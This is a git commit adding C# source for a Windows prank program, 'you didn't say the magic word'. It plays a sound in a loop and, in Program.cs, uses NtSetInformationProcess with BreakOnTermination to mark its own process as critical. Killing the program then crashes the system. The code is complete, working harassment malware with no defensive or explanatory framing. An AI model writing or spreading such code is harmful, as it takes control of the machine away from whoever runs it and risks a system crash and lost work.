25932557c30c0ea1f8b31799d333085aeddf731a
Zeeraa <udenanton@hotmail.com>
2018-05-31 10:31:33 +0200

    Initial commit

---
+++ you didn't say the magic word/Form1.cs
@@ -0,0 +1,21 @@
+﻿using System;
+using System.Windows.Forms;
+using System.Media;
+
+
+namespace you_didn_t_say_the_magic_word
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            SoundPlayer sp = new SoundPlayer(Properties.Resources.sound);
+            sp.PlayLooping();
+        }
+    }
+}
---
+++ you didn't say the magic word/Program.cs
@@ -0,0 +1,35 @@
+﻿using System;
+using System.Windows.Forms;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace you_didn_t_say_the_magic_word
+{
+    static class Program
+    {
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
+
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+        [STAThread]
+        static void Main()
+        {
+            int isCritical = 1;
+            int BreakOnTermination = 0x1D;
+            try
+            {
+                Process.EnterDebugMode();
+                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
+            }
+            catch (Exception err)
+            {
+
+            }
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new Form1());
+        }
+    }
+}
